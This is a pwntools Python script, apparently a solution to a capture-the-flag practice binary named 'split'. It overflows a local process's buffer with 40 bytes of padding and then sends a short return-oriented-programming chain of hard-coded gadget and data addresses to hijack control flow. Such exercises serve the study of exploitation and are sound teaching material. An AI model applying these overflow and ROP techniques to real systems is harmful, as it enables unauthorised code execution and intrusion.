from pwn import *

exe = './split'

def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

gdbscript = '''
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

p = start()

p.sendline(40*b"a"+ p64(0x4007c3) + p64(0x601060)+ p64(0x000000000040074b))

p.interactive()

